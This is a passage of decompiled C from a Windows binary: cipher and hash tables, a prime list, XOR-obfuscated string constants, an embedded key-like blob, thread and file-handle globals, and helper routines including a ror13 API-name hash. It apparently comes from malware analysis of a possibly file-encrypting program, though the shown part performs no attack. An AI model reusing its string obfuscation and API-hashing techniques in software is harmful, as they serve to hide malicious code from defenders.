  1007938441,
  665439982,
  -916342987,
  -451091987,
  -1320715716,
  -539845543,
  1945261375,
  -837543815,
  935818175,
  -839429142,
  -1426235557,
  1866325780,
  -616269690,
  -206583167,
  -999769794,
  874788908,
  1084473951,
  -1021503886,
  635616268,
  1228679307,
  -1794244799,
  27801969,
  -1291056930,
  -457910116,
  -1051302768,
  -2067039391,
  -1238182544,
  1550600308,
  1471729730
}; // weak
int dword_416D70[256] =
{
  -195997529,
  1098797925,
  387629988,
  658151006,
  -1422144661,
  -1658851003,
  -89347240,
  -481586429,
  807425530,
  1991112301,
  -863465098,
  49620300,
  -447742761,
  717608907,
  891715652,
  1656065955,
  -1310832294,
  -1171953893,
  -364537842,
  -27401792,
  801309301,
  1283527408,
  1183687575,
  -747911431,
  -1895569569,
  -1844079204,
  1841294202,
  1385552473,
  -1093390973,
  1951978273,
  -532076183,
  -913423160,
  -1032492407,
  -1896580999,
  1486449470,
  -1188569743,
  -507595185,
  -1997531219,
  550069932,
  -830622662,
  -547153846,
  451248689,
  1368875059,
  1398949247,
  1689378935,
  1807451310,
  -2114052960,
  150574123,
  1215322216,
  1167006205,
  -560691348,
  2069018616,
  1940595667,
  1265820162,
  534992783,
  1432758955,
  -340654296,
  -1255210046,
  -981034373,
  936617224,
  674296455,
  -1088179547,
  50510442,
  384654466,
  -813028580,
  2041025204,
  133427442,
  1766760930,
  -630862348,
  84334014,
  886120290,
  -1497068802,
  775200083,
  -207445931,
  -1979370783,
  -156994069,
  -2096416276,
  1614850799,
  1901987487,
  1857900816,
  557775242,
  -577356538,
  1054715397,
  -431143235,
  1418835341,
  -999226019,
  100954068,
  1348534037,
  -1743182597,
  -1110009879,
  1082772547,
  -647530594,
  -391070398,
  -1995994997,
  434583643,
  -931537938,
  2090944266,
  1115482383,
  -2064070370,
  0,
  -2146860154,
  724715757,
  287222896,
  1517047410,
  251526143,
  -2062592456,
  -1371726123,
  758523705,
  252339417,
  1550328230,
  1536938324,
  908343854,
  168604007,
  1469255655,
  -290139498,
  -1692688751,
  -1065332795,
  -597581280,
  2002413899,
  303830554,
  -1813902662,
  -1597971158,
  574374880,
  454171927,
  151915277,
  -1947030073,
  -1238517336,
  504678569,
  -245922535,
  1974422535,
  -1712407587,
  2141453664,
  33005350,
  1918680309,
  1715782971,
  -77908866,
  1133213225,
  600562886,
  -306812676,
  -457677839,
  836225756,
  1665273989,
  -1760346078,
  -964419567,
  1250262308,
  -1143801795,
  -106032846,
  700935585,
  -1642247377,
  -1294142672,
  -2045907886,
  -1049112349,
  -1288999914,
  1890163129,
  -1810761144,
  -381214108,
  -56048500,
  -257942977,
  2102843436,
  857927568,
  1233635150,
  953795025,
  -896729438,
  -728222197,
  -173617279,
  2057644254,
  -1210440050,
  -1388337985,
  976020637,
  2018512274,
  1600822220,
  2119459398,
  -1913208301,
  -661591880,
  959340279,
  -1014827601,
  1570750080,
  -798393197,
  -714102483,
  634368786,
  -1396163687,
  403744637,
  -1662488989,
  1004239803,
  650971512,
  1500443672,
  -1695809097,
  1334028442,
  -1780062866,
  -5603610,
  -1138685745,
  368043752,
  -407184997,
  1867173430,
  -1612000247,
  -1339435396,
  -1540247630,
  1059729699,
  -1513738092,
  -1573535642,
  1316239292,
  -2097371446,
  -1864322864,
  -1489824296,
  82922136,
  -331221030,
  -847311280,
  -1860751370,
  1299615190,
  -280801872,
  -1429449651,
  -1763385596,
  -778116171,
  1783372680,
  750893087,
  1699118929,
  1587348714,
  -1946067659,
  -2013629580,
  201010753,
  1739807261,
  -611167534,
  283718486,
  -697494713,
  -677737375,
  -1590199796,
  -128348652,
  334203196,
  -1446056409,
  1639396809,
  484568549,
  1199193265,
  -761505313,
  -229294221,
  337148366,
  -948715721,
  -145495347,
  -44082262,
  1038029935,
  1148749531,
  -1345682957,
  1756970692,
  607661108,
  -1547542720,
  488010435,
  -490992603,
  1009290057,
  234832277,
  -1472630527,
  201907891,
  -1260872476,
  1449431233,
  -881106556,
  852848822,
  1816687708,
  -1194311081
}; // weak
int dword_417170[256] =
{
  1364240372,
  2119394625,
  449029143,
  982933031,
  1003187115,
  535905693,
  -1398056710,
  1267925987,
  542505520,
  -1376359050,
  -2003732788,
  -182105086,
  1341970405,
  -975713494,
  645940277,
  -1248877726,
  -565617999,
  627514298,
  1167593194,
  1575076094,
  -1023249105,
  -2129465268,
  -1918658746,
  1808202195,
  65494927,
  362126482,
  -1075086739,
  -1780852398,
  -735214658,
  1490231668,
  1227450848,
  -1908094775,
  1969916354,
  -193431154,
  -1721024936,
  668823993,
  -1095348255,
  -266883704,
  -916018144,
  2108963534,
  1662536415,
  -444452582,
  -1755303087,
  1648721747,
  -1310689436,
  -1148932501,
  -31678335,
  -107730168,
  1884842056,
  -1894122171,
  -1803064098,
  1387788411,
  -1423715469,
  1927414347,
  -480800993,
  1714072405,
  -1308153621,
  788775605,
  -2036696123,
  -744159177,
  821200680,
  598910399,
  45771267,
  -312704490,
  -1976886065,
  -1483557767,
  -202313209,
  1319232105,
  1707996378,
  114671109,
  -786472396,
  -997523802,
  882725678,
  -1566550541,
  87220618,
  -1535775754,
  188345475,
  1084944224,
  1577492337,
  -1118760850,
  1056541217,
  -1774385443,
  -575797954,
  1296481766,
  -1850372780,
  1896177092,
  74437638,
  1627329872,
  421854104,
  -694687299,
  -1983102144,
  1735892697,
  -1329773848,
  126389129,
  -415737063,
  2044456648,
  -1589179780,
  2095648578,
  -121037180,
  0,
  159614592,
  843640107,
  514617361,
  1817080410,
  -33816818,
  257308805,
  1025430958,
  908540205,
  174381327,
  1747035740,
  -1680780197,
  607792694,
  212952842,
  -1827674281,
  -1261267218,
  463376795,
  -2142255680,
  1638015196,
  1516850039,
  471210514,
  -502613357,
  -1058723168,
  1011081250,
  303896347,
  235605257,
  -223492213,
  767142070,
  348694814,
  1468340721,
  -1353971851,
  -289677927,
  -1543675777,
  -140564991,
  1555887474,
  1153776486,
  1530167035,
  -1955190461,
  -874723805,
  -1234633491,
  -1201409564,
  -674571215,
  1108378979,
  322970263,
  -2078273082,
  -2055396278,
  -755483205,
  -1374604551,
  -949116631,
  491466654,
  -588042062,
  233591430,
  2010178497,
  728503987,
  -1449543312,
  301615252,
  1193436393,
  -1463513860,
  -1608892432,
  1457007741,
  586125363,
  -2016981431,
  -641609416,
  -1929469238,
  -1741288492,
  -1496350219,
  -1524048262,
  -635007305,
  1067761581,
  753179962,
  1343066744,
  1788595295,
  1415726718,
  -155053171,
  -1863796520,
  777975609,
  -2097827901,
  -1614905251,
  1769771984,
  1873358293,
  -810347995,
  -935618132,
  279411992,
  -395418724,
  -612648133,
  -855017434,
  1861490777,
  -335431782,
  -2086102449,
  -429560171,
  -1434523905,
  554225596,
  -270079979,
  -1160143897,
  1255028335,
  -355202657,
  701922480,
  833598116,
  707863359,
  -969894747,
  901801634,
  1949809742,
  -56178046,
  -525283184,
  857069735,
  -246769660,
  1106762476,
  2131644621,
  389019281,
  1989006925,
  1129165039,
  -866890326,
  -455146346,
  -1629243951,
  1276872810,
  -1044898004,
  1182749029,
  -1660622242,
  22885772,
  -93096825,
  -80854773,
  -1285939865,
  -1840065829,
  -382511600,
  1829980118,
  -1702075945,
  930745505,
  1502483704,
  -343327725,
  -823253079,
  -1221211807,
  -504503012,
  2050797895,
  -1671831598,
  1430221810,
  410635796,
  1941911495,
  1407897079,
  1599843069,
  -552308931,
  2022103876,
  -897453137,
  -1187068824,
  942421028,
  -1033944925,
  376619805,
  -1140054558,
  680216892,
  -12479219,
  963707304,
  148812556,
  -660806476,
  1687208278,
  2069988555,
  -714033614,
  1215585388,
  -800958536
}; // weak
int dword_417574[167] =
{
  5,
  7,
  11,
  13,
  17,
  19,
  23,
  29,
  31,
  37,
  41,
  43,
  47,
  53,
  59,
  61,
  67,
  71,
  73,
  79,
  83,
  89,
  97,
  101,
  103,
  107,
  109,
  113,
  127,
  131,
  137,
  139,
  149,
  151,
  157,
  163,
  167,
  173,
  179,
  181,
  191,
  193,
  197,
  199,
  211,
  223,
  227,
  229,
  233,
  239,
  241,
  251,
  257,
  263,
  269,
  271,
  277,
  281,
  283,
  293,
  307,
  311,
  313,
  317,
  331,
  337,
  347,
  349,
  353,
  359,
  367,
  373,
  379,
  383,
  389,
  397,
  401,
  409,
  419,
  421,
  431,
  433,
  439,
  443,
  449,
  457,
  461,
  463,
  467,
  479,
  487,
  491,
  499,
  503,
  509,
  521,
  523,
  541,
  547,
  557,
  563,
  569,
  571,
  577,
  587,
  593,
  599,
  601,
  607,
  613,
  617,
  619,
  631,
  641,
  643,
  647,
  653,
  659,
  661,
  673,
  677,
  683,
  691,
  701,
  709,
  719,
  727,
  733,
  739,
  743,
  751,
  757,
  761,
  769,
  773,
  787,
  797,
  809,
  811,
  821,
  823,
  827,
  829,
  839,
  853,
  857,
  859,
  863,
  877,
  881,
  883,
  887,
  907,
  911,
  919,
  929,
  937,
  941,
  947,
  953,
  967,
  971,
  977,
  983,
  991,
  997,
  -103
}; // weak
int dword_417810[] = { 1116352408 }; // weak
int dword_417814[] = { 1899447441 }; // weak
int dword_417818[] = { -1245643825 }; // weak
int dword_41781C[] = { -373957723 }; // weak
int dword_417820[] = { 961987163 }; // weak
int dword_417824[] = { 1508970993 }; // weak
int dword_417828[] = { -1841331548 }; // weak
int dword_41782C[] = { -1424204075 }; // weak
const IID stru_418F58 = { 169267605u, 28487u, 18788u, { 146u, 135u, 159u, 75u, 171u, 109u, 152u, 39u } }; // idb
const IID riid = { 1860005236u, 49159u, 20085u, { 183u, 106u, 229u, 116u, 9u, 149u, 226u, 76u } }; // idb
__int128 xmmword_418F80 = 0x2627213C2B2D3A212C2D1A3B0E7C7Ei64; // weak
__int128 xmmword_418F90 = 0x2E2056285320565316051A01175336i64; // weak
__int128 xmmword_418FA0 = 0x525244424E53711517564E76526821i64; // weak
__int128 xmmword_418FB0 = 0x531D1C1A07121E011C151D1A531601i64; // weak
__int128 xmmword_418FD0 = 0x6372686B442762716E736662754407i64; // weak
__int128 xmmword_418FE0 = 0x686174795E7F687D6C7D61616C5A0Di64; // weak
__int128 xmmword_419000 = 0x786F61657848495A436F68656E4B0Ai64; // weak
__int128 xmmword_419010 = 0x11C01060148071C480C0D0401092E68i64; // weak
__int128 xmmword_419020 = 0x27473500A175E12121F0A0D10175E1Ai64; // weak
__int128 xmmword_419030 = 0x6030C034F42574C5703500603700623i64; // weak
__int128 xmmword_419040 = 0x61D1A071C1D09480C0D1E07050D3A68i64; // weak
__int128 xmmword_419050 = 0x8111D1B0C5E030A120B1F181B1A055Ei64; // weak
__int128 xmmword_419070 = 0xA01160516531D1A5317160712101C1Fi64; // weak
__int128 xmmword_419080 = 0xA0C110E13175E0C0B11075E12123F7Ei64; // weak
__int128 xmmword_419090 = 0xA0C1F0E531A170C160A5E1B160A5E16i64; // weak
__int128 xmmword_4190A0 = 0xA1153171607030A01101D1653160112i64; // weak
__int128 xmmword_4190B0 = 0xA17095E0D1B1217185E0C0B11075E1Bi64; // weak
__int128 xmmword_4190C0 = 0xA1B0D515E0A171A1B1A1D1C5E1D517Ei64; // weak
__int128 xmmword_4190D0 = 0xA1F5E07103F74735F1A1B0A0E070C1Di64; // weak
__int128 xmmword_4190E0 = 0xB11075E0C11185E121F0A1F185E1B1Ci64; // weak
__int128 xmmword_4190F0 = 0xC110A0D1B0C5E110A5E0D0A0E131B0Ai64; // weak
__int128 xmmword_419100 = 0xC1F1A17181905041326020306183F76i64; // weak
__int128 xmmword_419110 = 0xD0C0E10011067372D2624020F121043i64; // weak
__int128 xmmword_419120 = 0xE190C1D0C10101D0B5C0C0908192F7Ci64; // weak
__int128 xmmword_419130 = 0xE5E393037272B3C5E273230315E3B32i64; // weak
__int128 xmmword_419140 = 0x100D1C06070B48293B3A480D12010409i64; // weak
__int128 xmmword_419150 = 0x10115E0D175E1B0C1B162A7473500D0Bi64; // weak
__int128 xmmword_419160 = 0x10175E151017125E101B0E315E504C5Ei64; // weak
__int128 xmmword_419170 = 0x101B5E1B0C1F5E0D1B1217185E0A101Fi64; // weak
__int128 xmmword_419180 = 0x101F5E51190C11500A1D1B14110C0E0Ci64; // weak
__int128 xmmword_419190 = 0x110A500909095151440D0E0A0A165E53i64; // weak
__int128 xmmword_4191A0 = 0x121009113A5E504F5E02747374734415i64; // weak
__int128 xmmword_4191B0 = 0x12123F161E14082C530914080913347Di64; // weak
__int128 xmmword_4191C0 = 0x125A4F5213495E5857524F4D4F524913i64; // weak
__int128 xmmword_4191D0 = 0x134E5851545B1D5958494D444F5E5358i64; // weak
__int128 xmmword_4191E0 = 0x14120F181E1515143802170B1612287Bi64; // weak
__int128 xmmword_4191F0 = 0x160D101716140A1B0A7D15080A0A1459i64; // weak
__int128 xmmword_419200 = 0x16171F1C1553171607030A01101D1653i64; // weak
__int128 xmmword_419210 = 0x165E535E0C1B0D09110C1C5E2C312A5Ei64; // weak
__int128 xmmword_419220 = 0x17130432130E15080F0E2C2722233061i64; // weak
__int128 xmmword_419230 = 0x1729212B211B131F30160A1F2E0A3011i64; // weak
__int128 xmmword_419240 = 0x18150228191A171714381E19141F3A7Bi64; // weak
__int128 xmmword_419250 = 0x1A1261600F611411160F106361130F16i64; // weak
__int128 xmmword_419260 = 0x1A151B16601012597E4E43404D4E6522i64; // weak
__int128 xmmword_419270 = 0x1A355E0A3E5E16011C07001621531616i64; // weak
__int128 xmmword_419280 = 0x1B1910150A150E2C1B091E1938192F7Ci64; // weak
__int128 xmmword_419290 = 0x1B195E110A5E071F095E1B10115E0712i64; // weak
__int128 xmmword_4192A0 = 0x1C1E53011C15797E071A3118101C3F53i64; // weak
__int128 xmmword_4192B0 = 0x1D1F1C5E0D1B1217185E0C0B11075E0Ai64; // weak
__int128 xmmword_4192C0 = 0x1D37301E1E1E1D1C5352544953584949i64; // weak
__int128 xmmword_4192D0 = 0x1D444F491D4952531D52791D1E1D3730i64; // weak
__int128 xmmword_4192E0 = 0x1D4E4E585E524F4D1D5958515154763Di64; // weak
__int128 xmmword_4192F0 = 0x1D4F4852441D5B521D535254494D444Fi64; // weak
__int128 xmmword_419300 = 0x1D58505C53584F1D4952531D52791D1Ei64; // weak
__int128 xmmword_419310 = 0x1E011A1D4E1D4B4E0B0D07181C0B3D6Ei64; // weak
__int128 xmmword_419320 = 0x1E06363F343B0A7A3635282E3435195Ai64; // weak
__int128 xmmword_419330 = 0x1E1F02131C7A3E342F351C7A747A7A5Ai64; // weak
__int128 xmmword_419350 = 0x25560619021D05133256131419123776i64; // weak
__int128 xmmword_419360 = 0x26383430302351011B10123439242675i64; // weak
__int128 xmmword_419380 = 0x273C3E362153171D061C35535D535373i64; // weak
__int128 xmmword_419390 = 0x2A1B131F30160A1F2E0D113A120A2C7Ei64; // weak
__int128 xmmword_4193B0 = 0x2A58515D2E2D2A133404090A07042F68i64; // weak
__int128 xmmword_4193C0 = 0x2A5D502945295A5C5C455E295959452Di64; // weak
__int128 xmmword_4193E0 = 0x2B3C313A372C38151D1F15080A0A1459i64; // weak
__int128 xmmword_4193F0 = 0x2C312A2D3B2C74735F0D1B1217185E0Ci64; // weak
__int128 xmmword_419400 = 0x34322F3030353360242E211224126040i64; // weak
__int128 xmmword_419410 = 0x3929353C2B214E1E040F0D2B263B396Ai64; // weak
__int128 xmmword_419430 = 0x3B727264626E73712165646D6D684A01i64; // weak
__int128 xmmword_419440 = 0x3C372D312E5E3F2A3F3A5E2B31275E3Bi64; // weak
__int128 xmmword_419450 = 0x3E29242F22392D00080A001D1F1F014Ci64; // weak
__int128 xmmword_419460 = 0x3F271F2D242A293B210C7C7E3F271F48i64; // weak
__int128 xmmword_419470 = 0x40456A01556101495E43585F497E702Ci64; // weak
__int128 xmmword_419490 = 0x43424B450C554F4540435C5F59584D58i64; // weak
__int128 xmmword_4194A0 = 0x435942585A17641217525A425B586137i64; // weak
__int128 xmmword_4194B0 = 0x4446444D485748537101465443446521i64; // weak
__int128 xmmword_4194C0 = 0x444F4E45014F4E4855515853424F6421i64; // weak
__int128 xmmword_4194D0 = 0x484E534C4C494F1C7572116F797D1C3Ci64; // weak
__int128 xmmword_4194E0 = 0x484F494E53541D5855491D4A52515152i64; // weak
__int128 xmmword_4194F0 = 0x4915585E544F4D1D59584E5C584F5E53i64; // weak
__int128 xmmword_419500 = 0x4A5F434A670F696A6C0F4A4D404B6E2Fi64; // weak
__int128 xmmword_419510 = 0x4C01454D04015253544E4901454D0401i64; // weak
__int128 xmmword_419520 = 0x4C0D150A171C151D11125151440E0A0Ai64; // weak
__int128 xmmword_419530 = 0x4D1D4E5455491D53521D4E535254495Ei64; // weak
__int128 xmmword_419540 = 0x4D4F525E1D4F521D444F495348525E1Di64; // weak
__int128 xmmword_419550 = 0x4E181D4958535F484E1D515C5E52713Di64; // weak
__int128 xmmword_419560 = 0x4E4A524F7F1D4F52691D1E1D37301D5Ai64; // weak
__int128 xmmword_419580 = 0x4F4852441D53541D5958565E52515F1Di64; // weak
__int128 xmmword_419590 = 0x4F4E42445201454D0401524455544F48i64; // weak
__int128 xmmword_4195A0 = 0x4F5213495E5857524F4D4F5249134E58i64; // weak
__int128 xmmword_4195B0 = 0x4F5C4D1D594F5455491D5B521D4D5158i64; // weak
__int128 xmmword_4195F0 = 0x5153521D565354511D4E54556937303Di64; // weak
__int128 xmmword_419600 = 0x515C48535C50105F491212074E4D4949i64; // weak
__int128 xmmword_419610 = 0x5258404501454D04011B444C4875010Fi64; // weak
__int128 xmmword_419620 = 0x52691D1E1D3730144F48521D52491D58i64; // weak
__int128 xmmword_419630 = 0x5300161F1A155301061C0A531F1F3273i64; // weak
__int128 xmmword_419640 = 0x53001A5307121B0753070B075D00161Fi64; // weak
__int128 xmmword_419650 = 0x541D584E485C5E1D445C501D4E585449i64; // weak
__int128 xmmword_419660 = 0x5453554A5F485B52493E564B4949571Ai64; // weak
__int128 xmmword_419670 = 0x551D515C48535C501D4F584E481D4F58i64; // weak
__int128 xmmword_419680 = 0x551D5855491D5549544A1D4E5851545Bi64; // weak
__int128 xmmword_419690 = 0x58495F030C58454849484F4E0C4F032Ci64; // weak
__int128 xmmword_4196A0 = 0x585B1D4F545855491D59595C1D445855i64; // weak
__int128 xmmword_4196B0 = 0x585F1D445C501D4F584E4A524F7F1D4Fi64; // weak
__int128 xmmword_4196C0 = 0x586E6F646862655E6E6E794D677F590Bi64; // weak
__int128 xmmword_4196D0 = 0x5A53544E481D494D444F5E58591D5249i64; // weak
__int128 xmmword_4196E0 = 0x5A59544F5F1212074E4D4949551D584Ei64; // weak
__int128 xmmword_4196F0 = 0x5B524E1D44494F5C4D1D594F5455491Di64; // weak
__int128 xmmword_419700 = 0x5C591D495358535C504F584D1D584E48i64; // weak
__int128 xmmword_419710 = 0x5C5E1D445C501D49541D11584F5C4A49i64; // weak
__int128 xmmword_419720 = 0x5D41157A7C15525B5C41475441661535i64; // weak
__int128 xmmword_419730 = 0x5E0C1B0D09110C1C5E0C112A5E1A1F11i64; // weak
__int128 xmmword_419740 = 0x5E121217095E1B0C1F090A18110D5E07i64; // weak
__int128 xmmword_419750 = 0x5E13110C185E071B155E1B0A1F08170Ci64; // weak
__int128 xmmword_419760 = 0x5E58791D1E1D3730134E4E52511D5C49i64; // weak
__int128 xmmword_419780 = 0x5F5843434E0C515840594D4A4948570Ci64; // weak
__int128 xmmword_4197A0 = 0x6278786E782B6E7F6A796E656E4C2B0Bi64; // weak
__int128 xmmword_4197C0 = 0x6372636A6362267F766965716962676Ei64; // weak
__int128 xmmword_4197F0 = 0x6564756064736221727264626E735101i64; // weak
__int128 xmmword_419800 = 0x67674A242B787C646F6A63582B6E7F6Ei64; // weak
__int128 xmmword_419810 = 0x676E4F2B6562666F6A78787D2B68240Bi64; // weak
__int128 xmmword_419820 = 0x681D13564F524A4958531D58495C4F52i64; // weak
__int128 xmmword_419830 = 0x6861644B20744020687F62797E685F0Di64; // weak
__int128 xmmword_419840 = 0x68637F74637069656374267B726A7367i64; // weak
__int128 xmmword_419870 = 0x697B726E726F7E747019716C6E6E703Di64; // weak
__int128 xmmword_419880 = 0x6A636226686F6B626775757026652906i64; // weak
__int128 xmmword_4198B0 = 0x6B79706C706D7C76721B736E6C6C723Fi64; // weak
__int128 xmmword_4198C0 = 0x6E716A6D3E6D3B3E7B7D77686C7B4D1Ei64; // weak
__int128 xmmword_4198E0 = 0x716E7572217224216462687773645201i64; // weak
__int128 xmmword_419910 = 0x74526B6372757F55287F6A766B6F5506i64; // weak
__int128 xmmword_419920 = 0x746968616F267F656F6A697675737267i64; // weak
__int128 xmmword_419950 = 0x76736D61716D647379167E6361617F32i64; // weak
__int128 xmmword_419960 = 0x767F7677135D5A5E5752514413501C33i64; // weak
__int128 xmmword_419970 = 0x7A6F786B62790E5E444F4D6B667B792Ai64; // weak
__int128 xmmword_419980 = 0x7A757C776C5139786567716072677914i64; // weak
__int128 xmmword_419990 = 0x7B1D130E1D4137301D1C4F584E4A524Fi64; // weak
__int128 xmmword_4199A0 = 0x7B69607C607D6C66620B637E7C7C622Fi64; // weak
__int128 xmmword_4199B0 = 0x7C1D1D1E1E1E1D373037303730585A5Ci64; // weak
__int128 xmmword_4199C0 = 0x7F1D4F52691D53541D4E564F524A1D44i64; // weak
BYTE Src[256] =
{
  208u,
  64u,
  122u,
  201u,
  217u,
  124u,
  120u,
  203u,
  100u,
  90u,
  120u,
  149u,
  101u,
  89u,
  128u,
  68u,
  34u,
  84u,
  239u,
  101u,
  19u,
  94u,
  64u,
  2u,
  204u,
  170u,
  79u,
  25u,
  4u,
  190u,
  113u,
  215u,
  184u,
  243u,
  208u,
  64u,
  245u,
  51u,
  12u,
  83u,
  109u,
  227u,
  47u,
  170u,
  56u,
  198u,
  97u,
  148u,
  117u,
  245u,
  240u,
  2u,
  160u,
  129u,
  230u,
  32u,
  235u,
  91u,
  125u,
  215u,
  209u,
  246u,
  147u,
  43u,
  114u,
  229u,
  151u,
  3u,
  141u,
  79u,
  187u,
  150u,
  37u,
  213u,
  15u,
  225u,
  152u,
  11u,
  118u,
  9u,
  84u,
  42u,
  215u,
  228u,
  204u,
  228u,
  34u,
  28u,
  123u,
  216u,
  140u,
  127u,
  100u,
  72u,
  49u,
  43u,
  132u,
  52u,
  211u,
  179u,
  68u,
  113u,
  84u,
  18u,
  71u,
  37u,
  240u,
  7u,
  245u,
  193u,
  240u,
  223u,
  31u,
  179u,
  54u,
  71u,
  198u,
  167u,
  220u,
  17u,
  242u,
  74u,
  32u,
  221u,
  76u,
  18u,
  131u,
  126u,
  23u,
  143u,
  169u,
  90u,
  127u,
  192u,
  185u,
  16u,
  183u,
  54u,
  93u,
  7u,
  214u,
  238u,
  68u,
  155u,
  147u,
  204u,
  130u,
  151u,
  183u,
  40u,
  91u,
  134u,
  14u,
  135u,
  73u,
  196u,
  240u,
  116u,
  252u,
  110u,
  157u,
  126u,
  10u,
  209u,
  160u,
  204u,
  113u,
  168u,
  220u,
  173u,
  45u,
  116u,
  32u,
  213u,
  113u,
  4u,
  210u,
  222u,
  90u,
  104u,
  114u,
  15u,
  76u,
  9u,
  132u,
  34u,
  89u,
  26u,
  235u,
  106u,
  29u,
  161u,
  98u,
  191u,
  198u,
  45u,
  205u,
  228u,
  131u,
  218u,
  222u,
  199u,
  3u,
  182u,
  102u,
  67u,
  82u,
  147u,
  126u,
  7u,
  147u,
  105u,
  94u,
  71u,
  115u,
  11u,
  215u,
  47u,
  112u,
  45u,
  14u,
  14u,
  77u,
  59u,
  175u,
  205u,
  224u,
  195u,
  98u,
  198u,
  222u,
  233u,
  225u,
  137u,
  195u,
  185u,
  117u,
  248u,
  213u,
  148u,
  163u,
  175u,
  4u,
  61u,
  28u,
  112u,
  251u,
  126u,
  196u,
  229u,
  145u,
  38u,
  5u,
  160u,
  216u,
  139u
}; // weak
_UNKNOWN unk_41B100; // weak
int dword_41B110 = 0; // weak
LPCWSTR lpString1[512] =
{
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  
}; // weak
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
struct _RTL_CRITICAL_SECTION stru_41B938; // idb
HANDLE hObject[1024]; // weak
_DWORD dword_41C950[80]; // weak
BYTE Data[1280]; // weak
_DWORD dword_41CF90[129]; // weak
LPCVOID lpBuffer; // idb
_UNKNOWN unk_41D198; // weak
HANDLE ExistingCompletionPort; // idb
PSLIST_HEADER Block; // idb
int dword_41D220[43]; // weak
FILETIME FileTime; // idb
struct _RTL_CRITICAL_SECTION stru_41D2D4; // idb
PCWSTR SourceString; // idb
PCWSTR dword_41D2F8; // idb
int dword_41D2FC; // weak
char arglist[]; // idb
DWORD nCount; // idb
_UNKNOWN unk_41D308; // weak
int dword_41D310; // weak
HMODULE hModule; // idb
char byte_41D318; // weak
size_t Size; // idb
DWORD nNumberOfBytesToWrite; // idb
int dword_41D324; // weak
DWORD NumberOfConcurrentThreads; // idb
int dword_41D32C; // weak
int dword_41D330; // weak
int dword_41D334; // weak
int dword_41D338; // weak
int dword_41D33C; // weak
PVOID BaseAddress; // idb


//----- (00401000) --------------------------------------------------------
void *__thiscall sub_401000(void *this)
{
  return this;
}

//----- (00401010) --------------------------------------------------------
char *__thiscall sub_401010(char *this, int a2)
{
  return &this[a2];
}

//----- (00401020) --------------------------------------------------------
char __thiscall sub_401020(_BYTE *this, char a2)
{
  return a2 ^ *this;
}

//----- (00401030) --------------------------------------------------------
int __fastcall sub_401030(unsigned __int16 *a1, int a2)
{
  unsigned __int16 *v2; // ebx
  int v3; // esi
  unsigned int v4; // edi
  unsigned __int16 v5; // dx
  int v6; // esi
  char v7; // cl
  int v8; // eax

  while ( 1 )
  {
    v2 = a1;
    v3 = a2;
    v4 = *a1;
    if ( !(_WORD)v4 )
      break;
    v5 = *a1;
    v6 = __ROR4__(v3, 13);
    v7 = *a1 - 32;
    if ( v4 < 0x61 )
      v7 = v5;
    v8 = v7;
    a1 = v2 + 1;
    a2 = v8 + v6;
  }
  return a2;
}

//----- (004010AD) --------------------------------------------------------
void __usercall sub_4010AD(int a1@<eax>, char a2)
{
  char *v2; // ecx
  char v3; // sp
  int v4; // ecx
  unsigned int v5; // eax

  v4 = (v3 + 8 - (_BYTE)a1) & 0xF;
  v5 = __CFADD__(v4, a1) ? -1 : v4 + a1;
  if ( v5 < 0x1000 )
    __asm { retn }
  v2 = &a2;
  do
  {
    v2 -= 4096;
    v5 -= 4096;
  }
  while ( v5 >= 0x1000 );
  __asm { retn }
}
// 4010AE: variable 'v3' is possibly undefined

//----- (004010E0) --------------------------------------------------------
int __stdcall sub_4010E0(unsigned __int64 a1, __int64 a2)
{
  int v2; // edi
  int v3; // eax
  unsigned __int64 v4; // rtt
  __int64 v5; // rax
  unsigned __int64 v6; // rcx
  unsigned __int64 v7; // rax
  unsigned int v8; // esi
  unsigned __int64 v9; // rax

  v2 = 0;
  if ( (a1 & 0x8000000000000000ui64) != 0i64 )
  {
    v2 = 1;
    HIDWORD(a1) = -HIDWORD(a1) - ((_DWORD)a1 != 0);
    LODWORD(a1) = -(int)a1;
  }
  v3 = HIDWORD(a2);
  if ( a2 < 0 )
  {
    ++v2;
    v3 = -HIDWORD(a2) - ((_DWORD)a2 != 0);
    HIDWORD(a2) = v3;
    LODWORD(a2) = -(int)a2;
  }
  if ( v3 )
  {
    v6 = __PAIR64__(v3, a2);
    v7 = a1;
    do
    {
      v6 >>= 1;
      v7 >>= 1;
    }
    while ( HIDWORD(v6) );
    v8 = v7 / (unsigned int)v6;
    v9 = v8 * (unsigned __int64)(unsigned int)a2;
    if ( __CFADD__(HIDWORD(a2) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a2 * (unsigned __int64)v8) >> 32, v9 > a1) )
      --v8;
    v5 = v8;
  }
  else
  {
    LODWORD(v4) = a1;
    HIDWORD(v4) = HIDWORD(a1) % (unsigned int)a2;
    LODWORD(v5) = v4 / (unsigned int)a2;
    HIDWORD(v5) = HIDWORD(a1) / (unsigned int)a2;
  }
  if ( v2 == 1 )
    return -v5;
  return v5;
}

//----- (004011D0) --------------------------------------------------------
unsigned __int64 __stdcall sub_4011D0(unsigned __int64 a1, __int64 a2)
{
  int v2; // edi
  int v3; // eax
  unsigned __int64 v4; // rtt
  unsigned __int64 result; // rax
  unsigned __int64 v6; // rcx
  unsigned __int64 v7; // rax
  unsigned int v8; // eax
  int v9; // ecx
  bool v10; // cf
  unsigned __int64 v11; // rax

  v2 = 0;
  if ( (a1 & 0x8000000000000000ui64) != 0i64 )
  {
    v2 = 1;
    HIDWORD(a1) = -HIDWORD(a1) - ((_DWORD)a1 != 0);
    LODWORD(a1) = -(int)a1;
  }
  v3 = HIDWORD(a2);
  if ( a2 < 0 )
  {
    v3 = -HIDWORD(a2) - ((_DWORD)a2 != 0);
    HIDWORD(a2) = v3;
    LODWORD(a2) = -(int)a2;
  }
  if ( !v3 )
  {
    LODWORD(v4) = a1;
    HIDWORD(v4) = HIDWORD(a1) % (unsigned int)a2;
    result = v4 % (unsigned int)a2;
    if ( v2 - 1 < 0 )
      return result;
    return -(__int64)result;
  }
  v6 = __PAIR64__(v3, a2);
  v7 = a1;
  do
